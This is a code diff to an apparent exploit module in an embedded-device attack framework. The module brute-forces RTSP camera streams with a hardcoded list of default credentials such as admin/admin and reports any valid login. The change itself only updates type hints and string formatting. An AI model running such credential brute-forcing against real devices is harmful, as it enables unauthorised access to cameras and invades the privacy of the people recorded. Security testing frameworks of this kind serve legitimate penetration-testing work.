@@ -13,7 +13,7 @@ from typing import List, Tuple
 from embedxpl.core.exploit import *
 from embedxpl.core.exploit.exploit import BaseExploit
 
-_DEFAULT_CREDENTIALS: List[Tuple[str, str]] = [
+_DEFAULT_CREDENTIALS: list[tuple[str, str]] = [
     ("admin", "admin"),
     ("admin", "12345"),
     ("admin", "123456"),
@@ -72,17 +72,13 @@ class Exploit(BaseExploit):
 
     def run(self) -> None:
         print_status(
-            "RTSP brute-force on {}:{}{}...".format(
-                self.target, self.port, self.stream
-            )
+            f"RTSP brute-force on {self.target}:{self.port}{self.stream}..."
         )
 
         for username, password in _DEFAULT_CREDENTIALS:
             if self._try_credentials(username, password):
                 print_success(
-                    "Valid credentials — {}:{} @ rtsp://{}:{}/{}".format(
-                        username, password, self.target, self.port, self.stream
-                    )
+                    f"Valid credentials — {username}:{password} @ rtsp://{self.target}:{self.port}/{self.stream}"
                 )
                 return
 
